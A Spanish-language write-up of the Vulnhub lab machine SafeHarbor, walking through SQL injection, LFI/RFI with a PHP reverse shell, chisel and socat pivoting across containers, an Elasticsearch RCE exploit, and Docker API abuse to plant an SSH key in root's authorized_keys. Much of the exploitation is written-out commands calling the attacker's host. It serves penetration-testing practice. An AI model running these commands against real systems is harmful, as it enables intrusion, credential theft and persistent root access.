---
title: "SafeHarbor"
date: 2024-10-20 00:00:00 +0800
categories: writeups vulnhub
tags: infoleak inyecciónsql docker pivoting searchsploit writeup vulnhub
description: Writeup de la máquina SafeHarbor de Vulnhub.
---


## Configuraciones Previas

> En el caso de que no tengamos conectividad con la máquina Víctima lo que debemos hacer es realizar alguna de estas dos soluciones.

### Primera Solución

En primer lugar, lo que debemos hacer es mientras esta el **GRUB** (gestor de arranque) activo pulsar la letra <kbd>E</kbd> y estableceremos el bit de modo de root a **1** con la siguiente instrucción y seguidamente pulsaremos <kbd>CTRL</kbd>+<kbd>X</kbd>.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023232743.png>)

Automáticamente recibiremos una consola como **root** y en el archivo `/etc/network/interfaces` introduciremos lo siguiente.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023233426.png>)

Una vez hechas estas configuraciones, reiniciaremos la máquina y al hacer un [arp-scan](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Local C. Discorvery/arp-scan.md>) deberíamos ver la [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) de la máquina víctima pero no es el caso por lo que debemos de probar la siguiente solución.
### Segunda Solución

Volveremos a pulsar la letra <kbd>E</kbd> mientras esta activa el **GRUB** (gestor de arranque) y estableceremos el bit de modo de root a **1** con la siguiente instrucción y seguidamente pulsaremos <kbd>CTRL</kbd>+<kbd>X</kbd>.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023232743.png>)

Modificaremos la contraseña del **root** para poder editar la interfaz de red una vez se haya desplegado, es decir ejecutaremos la siguiente instrucción y reiniciaremos la máquina.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023233918.png>)

Una vez se haya iniciado la máquina víctima nos logearemos con el usuario **root** gracias a la contraseña que le hemos establecido previamente y ejecutaremos los siguiente comandos para asignar una [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) estática a la interfaz **ens33**.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023234303.png>)

Una vez hechas estas comprobaciones al ejecutar un [arp-scan](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Local C. Discorvery/arp-scan.md>) veremos como ahora nos detecta la máquina víctima.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023234338.png>)

___

## Reconocimiento

En primer lugar, aplicaremos un escaneo con [arp-scan](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Local C. Discorvery/arp-scan.md>) para ver la [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) de la máquina víctima.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023234338.png>)

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con un **TTL de 64**, además gracias al script **[whichSystem.py](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Sistema Operativo/whichSystem.py.md>)** podremos conocer dicha información.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023234807.png>)
### [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>)

En segundo lugar, realizaremos un escaneo usando [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 192.168.18.50 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023234912.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>), pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 192.168.18.50 -oN targeted
```

No observamos nada interesante a través del escaneo de [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>).

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241023235017.png>)

___
## Explotación

### SQL Injection

Como estaba el puerto 80 abierto nos dirigimos a la página web y nos encontramos un formulario para logearnos.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028230113.png>)

Lo primero que se nos ocurre probar aquí es una básica [SQL Inyection](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/Injections/SQL Inyection/SQL Inyection.md>) como es `' or 1=1-- -`.

> En este panel de login ocurre una cosa muy extraña, la primera vez que intentas la [SQL Inyection](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/Injections/SQL Inyection/SQL Inyection.md>) te da error, y en el segundo intento es cuando funciona correctamente.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028230246.png>)

### RFI

Tras investigar por la página web no encontraremos nada pero algo que nos llama la atención es la forma en la que se están mostrando las diferentes páginas, es decir a través del parámetro `p`.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028230426.png>)

Por lo que probaremos los distintos tipos de [LFI](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/LFI (Local File Inclusion)/LFI.md>) que existen pero no tendremos éxito.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028230628.png>)

También podemos probar los distintos tipos de [Wrappers LFI](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/LFI (Local File Inclusion)/LFI → RCE.md>) para leer el código fuente de los archivos php, un ejemplo sería el siguiente:

> En este caso será con el código fuente del archivo `transfer.php` donde encontramos información sensible.

```http
php://filter/convert.base64-encode/resource=transfer
```

Nos copiamos la cadena en base64 y aplicamos en siguiente comando para decodificarla:

```bash
echo "dCI+DQogIDxkg0KPC9ib2R5Pg...0K" | base64 -d
```

Veremos las credenciales para una base de datos por lo que nos guardaremos dicha información en un fichero.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102111323.png>)

Miraremos todo el código fuente de los archivos pero no encontraremos nada interesante, por lo pasaremos a probar si es vulnerable a un [RFI](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/RFI/RFI.md>).

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028230644.png>)

> Destacar que para que se acontezca el [RFI](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/RFI/RFI.md>) debemos acceder a los archivos de la página web, como lo son `balance` , `transfer`. De diferente forma no podremos acontecer el [RFI](<../../Introducción al Hacking/OWASP TOP 10 y vulnerabilidades web/RFI/RFI.md>) pues por detrás se está aplicando una validación para que únicamente se muestren dichos archivos. Además, si por ejemplo accedemos al archivo `balance.php` veremos que nos da un error pues automáticamente se esta concatenando la extensión `.php` por lo que tan solo deberemos acceder al archivo con nombre `balance`.

Nos montaremos un servidor con python y creamos un archivo llamado **balance.php** con el contenido de: [cmd.php](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/cmd.php.md#Con etiquetas preformateadas para ver mejor el output>)

Observamos que tenemos capacidad de ejecución remota de comandos y además veremos que estamos en un contenedor.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028231309.png>)

Como la **bash** no está instalada no podremos enviarnos una bash por lo que en ese caso pasaremos a usar el [php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php).

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028231635.png>)

Creamos un archivo con nombre con alguno de los archivos de la página web como por ejemplo **transfer.php** y como contenido meteremos el de la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) ([php-reverseshell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php), nos pondremos en escucha (`rlwrap nc -nlvp 443`) y accederemos a dicho archivo a través de la web para así poder recibir la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>).

### Primer Contenedor

> Lo primero que nos daremos cuenta al recibir la conexión es que contamos con una shell muy incómoda ya que no podemos hacer <kbd>CTRL</kbd>+<kbd>C</kbd>, lo peor es que no existe ninguna solución para poder operar más cómodamente por lo que tendremos que adaptarnos a esta shell.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028232000.png>)

Como bien hemos visto antes a través del **RCE** estamos en un contenedor, por lo que seguramente tendremos que escapar de este.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028232403.png>)

> Una vez recibimos la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) la página web se queda colgada, para evitar esto podemos hacer lo siguiente:
> 
> Nos [Transferir archivos](<../../Introducción al Hacking/Técnicas de escalada de privilegios/✅ Consideraciones/Transferir archivos.md>) el archivo que contiene la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) `wget 192.168.26.10/transfer.php`.
> Abrimos otra terminal y nos pondremos en escucha con `rlwrap nc -nlvp 433`.
> Ejecutaremos de nuevo la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) pero en segundo plano, es decir: `nohup php /tmp/transfer.php &`.
> 
> De esta forma el socket que se abre la [Reverse Shell](<../../Introducción al Hacking/Conceptos de explotación/Formas enviarnos una bash 💻/Reverse Shell.md>) a través de la página web podemos cerrarlo pues nos hemos abierto una nuevo conexión reversa en segundo plano.

Si miramos la tabla de arp veremos que existen muchos más contenedores por lo que debemos realizar un port forwading, para ello usaremos chisel y así poder analizar todos los contenedores que existen con sus respectivos puertos.

Vemos que el contenedor con [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) **172.20.0.138** contiene un servidor de mysql.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028234753.png>)

Veremos que el comando `arp -n` nos muestra menos información por lo que es más recomendable usar `arp -a`.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028232439.png>)

Para realizar dicho redireccionamiento de puerto nos descargaremos chisel usando **wget**.

```bash
wget 192.168.26.10/chisel
```

En la máquina atacante nos montaremos el servidor de chisel por el puerto **1234**.

```bash
./chisel server 1234 --reverse
```

Y en la máquina víctima nos conectaremos a dicho servidor de chisel que esta siendo ofrecido por el puerto **1234** y además nos mandaremos una conexión de tipo **SOCKS**.

```bash
./chisel client 192.168.26.10:1234 R:socks
```

> Para que nos funcione correctamente el Port Forwarding es importante tener configurado correctamente el archivo `/etc/proxychains.conf`.

Gracias a proxychains y a [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) comprobaremos que en la [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) **172.20.0.138** está abierto el puerto **3306** correspondiente a MySQL.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241028234733.png>)

Usando proxychains accederemos a la base de datos de mysql gracias a las credenciales encontradas anteriormente **root:TestPass123!**.

```bash
proxychains mysql -u root -h 172.20.0.138 -p
```

En la base de datos **HarborBankUsers** encontraremos las credenciales necesarias para conectarnos como dichos usuarios en la página web. 

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102113350.png>)

Volveremos a aprovecharnos de proxychains y [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) para descubrir que contenedores tienen el puerto **80** abierto, aunque lo que realmente nos permite esto es actualizar la tabla de arp y así poder ver los demás contenedores que existen.

> De esta forma el escaneo de [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>) irá muy lento.

```bash
proxychains nmap -sT -p80 --open -T5 -v -n -Pn 172.20.0.0/24
```

En su lugar usaremos esta forma ya que es mucho más rápida y optimizada.

```bash
seq 1 254 | xargs -P50 -I {} proxychains nmap -sT -p80 --open -T5 -v -n -Pn 172.20.0.{} 2>&1 | grep "open port"
```

Si volvemos a ver la tabla de arp veremos que han aperecido nuevas [Direcciones IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) ya que se han enviado trazas ARP al hacer el escaneo con [Nmap](<../../Introducción al Hacking/Reconocimiento/Enumeración de información/Enumeración de Red/Nmap.md>).

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241029002744.png>)

### Segundo Contenedor (ElasticSearch)

Como el **ElasticSearch** es más propenso a ser vulnerable intentaremos abuscar de este servicio para ganar acceso a otro contenedor y así tener otra vía de acceso, por lo que gracias al foxyproxy accederemos y vemos que tiene una versión antigua (**1.4.2**) ya que ahora van por la **8.15**.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241029002823.png>)

Usando `searchsploit` nos daremos cuenta que es vulnerable a un **RCE**.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241029001414.png>)

Volveremos a usar `proxychains` para lanzar dicho exploit sobre el contenedor víctima, ya que dicho contenedor tan sólo es accesible desde el contenedor que hemos ganado acceso.

```bash
proxychains python2 elasticsearch_exploit.py 172.20.0.124
```

Observaremos como recibimos una shell aunque no se trata de una shell totalmente interactiva por lo que no podremos cambiarnos directorios y demás, es decir al intentar algún comando de estos nos sacara de la shell pocha.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102113952.png>)

Como estamos como el usuario root podemos ver sus archivos de configuración (`.bash_history`) y vemos que en la contenedor con la [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) **172.20.0.1** está abierto el puerto **2375** correspondiente a la [Docker API](<../../Introducción al Hacking/Técnicas de escalada de privilegios/Docker Breakout/Docker API.md>).

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102114357.png>)

Como desde el primer contenedor no podemos acceder a la [Docker API](<../../Introducción al Hacking/Técnicas de escalada de privilegios/Docker Breakout/Docker API.md>) debemos crear un nuevo túnel gracias a socat a través del contenedor del elascticsearch.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102114633.png>)

___
## Escalada

### Último Contenedor

> Para poder operar más cómodamente y así poder explotar la [Docker API](<../../Introducción al Hacking/Técnicas de escalada de privilegios/Docker Breakout/Docker API.md>), en resumen debemos hacer: En el contenedor 2 del elasticsearch con [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) **172.20.0.124** debemos de crear un túnel hacia nuestro **Chisel Server** pero debemos de aplicar un pequeño salto a través del Contenedor 1.

En primer lugar, en el Contenedor 2 (Elascticsearch) nos conectaremos al contenedor accesible (Contenedor 1) usando el siguiente comando con chisel:

```bash
./chisel client 172.20.0.4:6564 R:8888:socks
```

En el Contenedor 1 con IP **172.20.0.4** gracias a socat redirigimos el socket que nos llegue por el puerto **6564** a nuestra [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) de atacante al puerto **1234** donde se encuentra nuestro **Chisel Server**, es decir debemos ejecutar el siguiente comando:

```bash
./socat tcp-l:6564,fork TCP:192.168.26.10:1234
```

Observamos como recibimos una nueva conexión a la cual podemos acceder a través del puerto **8888**.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102123922.png>)

> Es importante tener bien configurado el `/etc/proxychains.conf` para que podamos usar dos conexiones conexiones distintas, es decir tener habilitado el modo `dynamic_chain`.

Gracias al `proxychains` dinámico y al uso de **curl** podemos ver como efectivamente en la [Dirección IP](<../../Introducción al Hacking/Conceptos Básicos/Dirección IP.md>) **172.20.0.1** correspondiente a la máquina víctima real (**192.168.26.50**) podemos acceder a la [Docker API](<../../Introducción al Hacking/Técnicas de escalada de privilegios/Docker Breakout/Docker API.md>). En primer lugar, lo que debemos hacer es listar las imágenes que se encuentran disponibles en la máquina víctima.

```bash
proxychains curl http://172.20.0.1:2375/images/json 2>/dev/null | tail -n 1 | jq
```

Observamos que existen un montón de imágenes, pero nos quedaremos con la `alpine:3.2`.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102124108.png>)

Usando la anterior imagen procederemos a crear un nuevo contenedor con una montura de la raíz del sistema víctima en la ruta `/mnt` del contenedor para lograr esto ejecutaremos:

```bash
proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/containers/create\?name=test -d '{"Image":"alpine:3.2", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```

Para poner en marcha el anterior contenedor debemos copiarnos el `id` que nos devuelve el anterior comando y ejecutar el siguiente comando sustituyéndolo por dicho `<id>`.

```bash
proxychains curl -X POST -H "Content-Type: application/json" "http://172.20.0.1:2375/containers/<id>/start\?name=test"
```

Ahora debemos seleccionar el comando que queremos ejecutar en dicho contenedor (`cat /mnt/root/id_rsa`), para ello ejecutaremos el siguiente comando poniendo el `id` correspondiente del contenedor en `<id>`.

```bash
curl -X POST -H "Content-Type: application/json" "http://172.20.0.1:2375/containers/<id>/exec" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/root/id_rsa"]}'
```

Por último lo que debemos hacer es ejecutar dicha instrucción(`cat /mnt/root/id_rsa`), para ello ejecutaremos el siguiente comando pasándole el identificador devuelto por el anterior comando en `<id>`.

> Si queremos que nos muestre el output de dicho comando es importante añadir: `--output -`

```bash
proxychains curl -X POST -H "Content-Type: application/json" "http://172.20.0.1:2375/exec/<id>/start" -d '{}' --output -
```

Observamos como no existe la `id_rsa`:

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102124656.png>)

Por lo que usaremos otro método para ganar acceso a la máquina el cual se basa en poner nuestra clave pública (`id_rsa.pub`) en `/mnt/root/.ssh/authorized_keys`, es decir ejecutaremos:

```bash
proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/containers/c383e3115b5d22f943e0d09f80ad642a6e676f4eb7228606ce7fd74d41218832/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDNTE4MXRuakJrNk8rUTRpTTk2ejVybGFBcEZ1MEZNekwvalJZR0RZU2ZXNzluQTJLSS9aSEcvVVdOZEFHcUZ1Y3pUY3BTeWtJcTMrT0hJTEh5L0Jydm9MVFI3ZWYrZy9DdWwzS3RraTdOSkZISlNqRlh1OVcwbEdaTzZjNmpZZ0FCVzlsOXlhS3pQallmK2lTbnJBWDk0OUNDeTROaTlhaUs4OWdKSjFHMTZPcGZYYTVuOWtwSGJjRXg5V1BqUFE4OXQrL1ZHbHpYL1BoRHN2MGI1VkpkQnFSZ092aC9TdHFRUFJnalpqcGcvL01Cb0M4N2NTcHJVa1JxWTlaUWJZWU9LbWtDWDYxYVVQUmgrNktDd0hUTDdaZFk3MEJYM3RMWk5ZZ3hzR0R1U29NdHc1azB3UTFJUkkwM2ZFNXV1ZkxIc3BGcm5aeWtlV0pXbk03dG9wOWRoeDF1OWFFTktxbmN0M09iejl2dVMwekQwOExIY0lhbktHcUFwamkrMmZzRVpLSXk0cmloMlNCVi9kd2xLN3A1emM5U09NU1djNWptY0FMS2JtRDkxaE5IdE1LREExTWl5SDlENTNmSzZWWHV0aDN3ZHVqRTVQWGxuUnNVcmNYWVhsZ2N3OFErWG1DMW4rVk01NmloUW9SRGo4SjZycUFpWDhJOGZFd1BJK2s9IHRlcnJvckBwYXJyb3QK | base64 -d > /mnt/root/.ssh/authorized_keys"]}'
```

Para ejecutar el siguiente comando nos copiaremos el identificador que nos devuelve el anterior comando y lo ponemos en `<id>`.

```bash
proxychains curl -X POST -H "Content-Type: application/json" "http://172.20.0.1:2375/exec/<id>/start" -d '{}' --output -
```

Nos conectaremos a la máquina víctima a través de ssh usando nuestra `id_rsa`.

```bash
ssh -i /home/terror/id_rsa root@192.168.26.50
```

Observamos como hemos podido conectarnos a la máquina víctima gracias a que nuestra `id_rsa.pub` se encuentra en el `authorized_keys` de nuestra máquina víctima.

![](<../assets/images/posts/2024-10-20-safeharbor/Pasted image 20241102132256.png>)